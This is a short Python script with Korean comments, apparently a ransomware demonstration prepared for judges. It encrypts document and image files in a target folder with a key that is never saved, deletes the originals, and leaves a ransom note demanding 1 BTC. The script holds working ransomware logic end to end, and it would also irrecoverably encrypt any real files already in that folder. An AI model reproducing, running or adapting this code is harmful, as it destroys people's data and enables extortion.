import os
import time
from cryptography.fernet import Fernet
import requests


TARGET_DIR = "./targets"
# 암호화 키 생성 (이 키가 없으면 절대 복구 못 함 - 시연의 핵심)
key = Fernet.generate_key()
cipher = Fernet(key)

def simulate_real_ransomware():
    if not os.path.exists(TARGET_DIR):
        os.makedirs(TARGET_DIR)
        with open(f"{TARGET_DIR}/내_중요한_문서.docx", "w") as f: f.write("사용자의 기밀 문서")
        with open(f"{TARGET_DIR}/가족_사진.jpg", "w") as f: f.write("사진 데이터")

    print("[!] Ransomware v2.0 Started...")
    time.sleep(1)

    for filename in os.listdir(TARGET_DIR):
        if filename.endswith(".txt") or filename.endswith(".docx") or filename.endswith(".jpg"):
            path = os.path.join(TARGET_DIR, filename)
            print(f"[ENCRYPTING] {filename}...")
            
            with open(path, "rb") as f:
                data = f.read()
            
            # 실제 AES 암호화 적용
            encrypted_data = cipher.encrypt(data)
            
            with open(path + ".locked", "wb") as f:
                f.write(encrypted_data)
            
            os.remove(path) # 원본 삭제
            time.sleep(0.5)

    # 협박문 생성 (심사위원에게 보여줄 화면)
    with open(f"{TARGET_DIR}/!README_FOR_DECRYPT.txt", "w", encoding='utf-8') as f:
        f.write("HACKED!!\n당신의 모든 파일이 암호화되었습니다.\n복구를 원하면 1 BTC를 아래 주소로 보내십시오.\n키가 없으면 파일은 영구히 손실됩니다.")
    
    print("\n[!] ALL FILES ARE LOCKED. HACKED!!")

if __name__ == "__main__":
    simulate_real_ransomware()
